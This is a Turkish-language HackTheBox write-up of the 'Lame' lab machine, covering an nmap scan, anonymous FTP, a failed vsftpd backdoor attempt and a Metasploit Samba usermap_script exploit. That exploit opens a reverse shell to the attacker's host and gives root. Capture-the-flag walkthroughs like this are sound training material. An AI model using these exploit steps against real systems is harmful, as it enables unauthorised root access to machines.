---
title: 'HackTheBox | Lame WriteUp'
author: appdone
categories: [HackTheBox Machines]
tags: [smb, command injection]
render_with_liquid: false
media_subpath: /images/hackthebox_lame/
image:
  path: logo.webp
---

## Özet

Lame, Samba'nın zafiyetli sürümünü kullanan debian tabanlı kolay seviye bir makinedir. Metasploit üzerinden bu sürüme uygun olan exploit'i çalıştıracak ve sistemde yetkili bir bağlantıya sahip olacağız.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sSVC -T4 10.10.10.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m27s, deviation: 2h49m45s, median: 25s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-04-04T03:57:04-04:00
```

### 21 numaralı portun incelenmesi

21 numaralı portun üzerinde FTP servisi çalışıyor ve zafiyetli bir servis sürümü kullanılıyor. Anonymous olarak FTP servisine bağlandığımızda ise boş bir dizin ile karşılaşıyoruz.

```console
$ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:appdone): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
...
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
...
```

Sözde zafiyetli sürümünün üzerinde barınan backdoor kapalı gibi görünüyor, nitekim servisi sömüremiyoruz.

```console
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

### 22 numaralı portun incelenmesi

22 numaralı portun üzerinde `OpenSSH 4.7p1` sürümüne sahip bir SSH servisi çalışıyor. 4.4 ve 7.7 arasındaki sürümlerde kullanıcı isimlerini toplayabileceğimiz bir güvenlik zafiyeti olduğunu biliyoruz. Burayı şimdilik atlayacağım, çünkü bu işlem çok uzun sürüyor.

### 139/445 numaralı portun incelenmesi

139/445 portun üzerinde Samba'nın `smbd 3.0.20-Debian` sürümü çalışıyor. Bu sürümde `usermap script` adında bir exploit olduğunu biliyorum.

## Sömürü aşaması

Metasploit'i açıp, gerekli bilgileri doldurduktan sonra exploiti çalıştırıyor ve root haklarında bir shell elde ediyoruz.

```console
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit
[*] Started reverse TCP handler on 10.10.14.105:4444 
[*] Command shell session 1 opened (10.10.14.105:4444 -> 10.10.10.3:45047) at 2025-04-04 04:11:50 -0400

id
uid=0(root) gid=0(root)
```
